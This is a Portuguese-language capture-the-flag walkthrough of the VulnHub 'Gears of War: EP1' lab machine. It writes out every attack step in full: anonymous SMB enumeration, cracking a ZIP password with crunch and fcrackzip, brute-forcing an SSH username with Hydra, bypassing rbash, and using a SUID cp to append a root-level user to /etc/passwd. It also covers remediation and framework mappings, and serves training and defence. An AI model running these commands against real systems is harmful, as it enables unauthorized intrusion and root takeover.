# Gears of War: EP1 — Intel COG Coletada, Brecha no Inimigo, Root Conquistado

Bora rapaziada!! O COG nunca esperava táticas Locust nos seus próprios servidores. Gears of War: EP1 é uma máquina belissimamente temática que encadeia enumeração de compartilhamento SMB, quebra de senha ZIP com dica de padrão, descoberta de usuário SSH com Hydra, bypass de shell restrito e abuso de SUID cp para sobrescrever /etc/passwd e plantar um usuário de nível root. Cada técnica aqui é material do mundo real legítimo. Essa máquina tem alcance, sem mentira.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Gears of War: EP1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/gears-of-war-ep1,1,469/ |
| **Técnicas** | Nmap, enumeração de compartilhamento SMB (smbclient), quebra de ZIP com crunch + fcrackzip, descoberta de usuário SSH com Hydra, bypass de shell restrito (bash --noprofile), SUID cp para sobrescrever /etc/passwd |
| **CVEs** | CWE-284 (Controle de Acesso Impróprio: compartilhamento SMB sem autenticação), CWE-732 (Atribuição Incorreta de Permissão: SUID em /bin/cp), CWE-262 (Senha ZIP fraca sem envelhecimento) |
| **Grupos APT** | FIN7: usa enumeração de compartilhamento SMB para coleta de credenciais em ambientes corporativos; APT28: alavanca binários SUID mal configurados para escalação de privilégio em hosts Linux pós-acesso inicial |

---

## Resumo do Ataque

```
nmap → HTTP/80, SMB/139+445, SSH/22
  → smbclient -L $ALVO → compartilhamento LOCUS_LAN$
  → smbclient //$ALVO/LOCUS_LAN$ → get msg_horda.zip + SOS.txt
  → SOS.txt: padrão de senha ZIP "@%%," (1 minúscula + 2 dígitos + vírgula)
  → crunch 4 4 -t @%%, → wordlist.txt
  → fcrackzip -D -u -v -p wordlist.txt msg_horda.zip → r44M
  → unzip -P r44M msg_horda.zip → key.txt → senha SSH: 3_d4y
  → Hydra -L rockyou.txt -p 3_d4y $ALVO ssh → marcus:3_d4y
  → ssh marcus@$ALVO → shell restrito rbash
  → ssh marcus@$ALVO -t "bash --noprofile" → bash completo
  → find /bin -perm -u=s → /bin/cp (SUID!)
  → openssl passwd -1 -salt raj pass123 → hash
  → cp /etc/passwd /tmp/passwd → anexar raj:hash:0:0:raj:/root:/bin/bash
  → cp /tmp/passwd /etc/passwd (SUID cp executa como root)
  → su raj → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas: HTTP, SMB, SSH
2. Enumeração de compartilhamento SMB e acesso anônimo
3. Analisar dica SOS.txt, gerar wordlist direcionada com crunch
4. Ataque de senha fcrackzip no arquivo ZIP
5. Extrair senha SSH do key.txt
6. Brute-force SSH com Hydra para identificar usuário válido
7. SSH com shell restrito, bypass via bash --noprofile
8. Enumerar binários SUID, encontrar /bin/cp
9. Sobrescrever /etc/passwd com novo usuário UID 0 via SUID cp
10. su para nova conta de nível root, capturar flag

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.184

nmap -A -p- 192.168.1.184
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.x
80/tcp  open  http        Apache httpd
139/tcp open  netbios-ssn Samba
445/tcp open  microsoft-ds Samba
```

HTTP não retorna nada acionável após revisão rápida. SMB é a principal superfície de ataque. Começar com enumeração de compartilhamentos.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração de Compartilhamento SMB

Listar compartilhamentos disponíveis sem credenciais:

```bash
smbclient -L 192.168.1.184
# Senha: (apenas Enter para acesso anônimo)
```

```
Sharename       Type      Comment
---------       ----      -------
LOCUS_LAN$      Disk
IPC$            IPC       IPC Service
```

Conectar ao compartilhamento:

```bash
smbclient //192.168.1.184/LOCUS_LAN$
smb: \> ls
smb: \> get msg_horda.zip
smb: \> get SOS.txt
smb: \> exit

cat SOS.txt
```

SOS.txt contém o padrão de senha ZIP: `@%%,` (notação crunch: uma letra minúscula, dois dígitos, uma vírgula literal).

**Nota do mundo real:** Acesso a compartilhamento SMB sem autenticação (sessões null) permanece um dos achados mais comuns em testes de penetração de redes corporativas. APT28 e FIN7 usam enumeração de compartilhamento SMB como um passo inicial pós-acesso para identificar locais de staging de dados e credenciais arquivadas.

**MITRE ATT&CK:** T1135 — Descoberta de Compartilhamento de Rede; T1039 — Dados de Drive Compartilhado de Rede

---

## Passo 3 — Quebra de Senha ZIP: crunch + fcrackzip

A dica do SOS.txt fornece a string de formato exata para crunch: `@%%,`

Na sintaxe crunch:
- `@` = uma letra minúscula (a-z)
- `%` = um dígito (0-9)
- `%` = um dígito (0-9)
- `,` = caractere vírgula literal

Gerar a wordlist:

```bash
crunch 4 4 -t @%%, -o /tmp/gow_wordlist.txt
# Gera: a00, até z99, (26 × 100 = 2.600 candidatos)
```

Quebrar o ZIP:

```bash
fcrackzip -D -u -v -p /tmp/gow_wordlist.txt msg_horda.zip
```

**Senha encontrada:** `r44M`

Extrair:

```bash
unzip -P r44M msg_horda.zip
cat key.txt
# Senha SSH: 3_d4y
```

**Nota do mundo real:** Quando um atacante conhece a política de senha (comprimento + classes de caracteres), o keyspace cai dramaticamente. Uma senha de 4 caracteres com restrições de classe conhecidas tem no máximo dezenas de milhares de candidatos.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 4 — Descoberta de Usuário SSH com Hydra

A senha SSH é conhecida (`3_d4y`) mas o usuário não. Usar Hydra para identificar um usuário SSH válido tentando rockyou.txt como nomes de usuário com a senha fixa:

```bash
hydra -L /usr/share/wordlists/rockyou.txt \
  -p 3_d4y \
  -T 4 \
  192.168.1.184 ssh
```

**Credenciais válidas:** `marcus` / `3_d4y`

**MITRE ATT&CK:** T1110.003 — Força Bruta: Password Spraying

---

## Passo 5 — Login SSH e Bypass de Shell Restrito

```bash
ssh marcus@192.168.1.184
# Senha: 3_d4y
```

O shell é restrito (rbash). Fazer bypass imediatamente na hora da conexão:

```bash
ssh marcus@192.168.1.184 -t "bash --noprofile"
# Senha: 3_d4y
```

Isso força um shell Bash completo sem carregar .bash\_profile, que pode reiniciar o shell restrito. Shell completo adquirido.

**Métodos alternativos de bypass:**

```bash
# Via Python:
python3 -c "import pty; pty.spawn('/bin/bash')"

# Via vi/vim:
vi
:!/bin/bash
```

**Nota do mundo real:** Shells restritos (rbash) são uma tentativa comum de contenção de privilégio Linux. Porém são trivialmente bypassados via comandos forçados SSH, Python pty ou shells de editor. Fornecem valor de segurança mínimo sem perfis AppArmor/SELinux fortes.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Enumeração de Binário SUID

```bash
find /bin -perm -u=s -type f 2>/dev/null
# /bin/cp
```

`/bin/cp` tem o bit SUID. Quando executado, roda como root independentemente de quem o invoca. Isso significa que qualquer usuário pode usar `cp` para sobrescrever qualquer arquivo do sistema, incluindo `/etc/passwd`.

**MITRE ATT&CK:** T1548.001 — Abuso de Controle de Elevação: Setuid

---

## Passo 7 — Sobrescrever /etc/passwd via SUID cp

Gerar hash de senha para o novo usuário:

```bash
openssl passwd -1 -salt raj pass123
# Saída exemplo: $1$raj$abc123...
```

Copiar /etc/passwd para localização gravável e adicionar novo usuário de nível root:

```bash
cp /etc/passwd /tmp/passwd

echo "raj:$(openssl passwd -1 -salt raj pass123):0:0:raj:/root:/bin/bash" >> /tmp/passwd
```

Sobrescrever /etc/passwd usando SUID cp (executa como root):

```bash
cp /tmp/passwd /etc/passwd
```

Trocar para a nova conta de nível root:

```bash
su raj
Password: pass123

id
# uid=0(root) gid=0(root) groups=0(root)
```

Root capturado.

**Nota do mundo real:** O bit SUID no `cp` é uma das misconfigurações mais críticas em um sistema Linux. Trivialmente permite que qualquer usuário sobrescreva `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, chaves SSH, scripts cron ou qualquer arquivo. APT28 e múltiplos operadores de ransomware usam abuso de binário SUID como técnica padrão de escalação de privilégio durante a fase de pós-exploração.

**MITRE ATT&CK:** T1548.001 — Abuso de Controle de Elevação: Setuid; T1222 — Modificação de Permissões de Arquivo e Diretório

---

## Passo 8 — Capturar Flag Root

```bash
cd /root
ls -la
cat flag.txt
```

Missão cumprida. Marcus foi eliminado. Servidor COG comprometido.

**MITRE ATT&CK:** T1005 — Dados do Sistema Local

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| Arquivo ZIP | msg\_horda.zip | Compartilhamento SMB LOCUS\_LAN$ | fcrackzip + crunch → r44M |
| Credencial | marcus:3\_d4y | key.txt (do ZIP) + Hydra | Login SSH |
| Novo usuário root | raj:pass123 | Criado via SUID cp + openssl | su raj → uid=0 |
| Flag root | flag.txt | /root/flag.txt | Capturada |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Acesso anônimo SMB vaza dados arquivados sensíveis | Compartilhamentos SMB sem autenticação são um achado de alta severidade consistente em redes corporativas | Exigir autenticação em todos os compartilhamentos SMB; auditar com `smbclient -L` ou CrackMapExec |
| 2 | Dica de senha ZIP no mesmo compartilhamento que o ZIP | Com padrão de senha conhecido, keyspace colapsa de bilhões para milhares | Usar senhas longas aleatórias para arquivos criptografados; nunca armazenar dicas perto do arquivo |
| 3 | Bit SUID no /bin/cp permite sobrescrever /etc/passwd | SUID em utilitários de cópia de arquivo é uma das misconfigurações mais perigosas no Linux | Auditar binários SUID: `find / -perm -u=s -type f`; remover SUID de binários não essenciais |
| 4 | Shell restrito (rbash) bypassado via comando forçado SSH | rbash fornece segurança mínima sem enforcement MAC adicional (AppArmor/SELinux) | Usar perfis AppArmor/SELinux para forçar restrições de shell; considerar jails chroot |
| 5 | Credenciais arquivadas em compartilhamento de rede ZIP | Mesmo ZIPs protegidos por senha são quebráveis com política de senha fraca ou com dica | Nunca armazenar credenciais em locais acessíveis pela rede, mesmo dentro de arquivos |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Compartilhamento de Rede | T1135 |
| Coleta | Coleta | Dados de Drive Compartilhado de Rede | T1039 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying (Hydra SSH) | T1110.003 |
| Acesso Inicial | Acesso Inicial | Contas Válidas (SSH) | T1078 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Escalação de Privilégio | Escalação de Privilégio | Abuso de Controle de Elevação: Setuid (cp) | T1548.001 |
| Persistência | Escalação de Privilégio | Criar Conta | T1136.001 |
| Coleta | Coleta | Dados do Sistema Local (flag) | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Exigir autenticação em todos os compartilhamentos SMB** — desabilitar sessões null na config Samba: `map to guest = never`; restringir acesso a grupos AD específicos
2. **Remover SUID do /bin/cp** — `chmod u-s /bin/cp`; auditar todos os binários SUID trimestralmente
3. **Nunca armazenar credenciais em arquivos acessíveis pela rede** — usar gerenciador de segredos; se arquivamento for necessário, usar senhas longas aleatórias sem dicas
4. **Aplicar AppArmor/SELinux para usuários com shell restrito** — rbash sozinho é insuficiente; combinar com perfis MAC
5. **Auditar /etc/passwd e /etc/shadow para contas não autorizadas** — monitorar novas contas UID 0 via monitoramento de integridade de arquivo (AIDE)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os compartilhamentos SMB; auditar binários SUID |
| Proteger | Controle de Acesso | Exigir autenticação SMB; remover SUID do cp; aplicar AppArmor |
| Proteger | Segurança de Dados | Sem credenciais em arquivos acessíveis pela rede; gerenciamento criptografado de segredos |
| Detectar | Anomalias e Eventos | Alertar em modificações do /etc/passwd; monitorar tentativas de sessão null SMB |
| Responder | Planejamento de Resposta | Remover contas não autorizadas; rotacionar credenciais; corrigir misconfiguraçao SUID |
| Recuperar | Planejamento de Recuperação | Restaurar /etc/passwd do backup; reconstruir se rootkit for suspeito |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Exigir autenticação SMB; restringir binários SUID |
| AC-6 | Mínimo Privilégio | Remover SUID de binários não essenciais; sem utilitários de cópia com superprivilégios |
| CM-7 | Funcionalidade Mínima | Desabilitar compartilhamentos SMB sem autenticação |
| CM-6 | Definições de Configuração | Auditar bits SUID; monitorar /etc/passwd para adições UID 0 |
| IA-5 | Gerenciamento de Autenticadores | Senhas longas aleatórias para arquivos; sem dicas perto do arquivo |
| SI-7 | Integridade de Software, Firmware e Informação | Monitoramento de integridade de arquivo para /etc/passwd, /etc/shadow |

### CISA KEV

Acesso a sessão null SMB e abuso de binário SUID mapeiam para técnicas descritas no CISA Alert AA22-074A (técnicas de pós-exploração de atores de ameaça). Organizações são aconselhadas a auditar permissões de compartilhamento SMB e binários SUID.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gestão de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (desabilitar sessões null SMB; remover SUID cp)
- **D3-OAM** — Gerenciamento Administrativo do SO (auditar SUID; monitorar /etc/passwd)
- **D3-FIM** — Monitoramento de Integridade de Arquivo (/etc/passwd, /etc/shadow, /etc/sudoers)

---

## Considerações Finais

Mano, Gears of War: EP1 é uma cadeia bem construída que recompensa enumeração sistemática em cada passo. Acesso a sessão null SMB ainda é um achado real em ambientes corporativos. SUID no /bin/cp é severidade crítica imediata em qualquer relatório de pentest. O bypass de shell restrito mostra que controles de segurança em camadas sem enforcement MAC não fornecem proteção real. Cada técnica aqui mapeia para algo que você vai encontrar no mundo real. Se você jogou essa máquina e entendeu a técnica SUID cp, você entende um dos caminhos de escalação de privilégio mais confiáveis em sistemas Linux mal configurados. Treinamento legítimo, véi, caramba que máquina top!

Thanks guys!! (❍ᴥ❍ʋ)
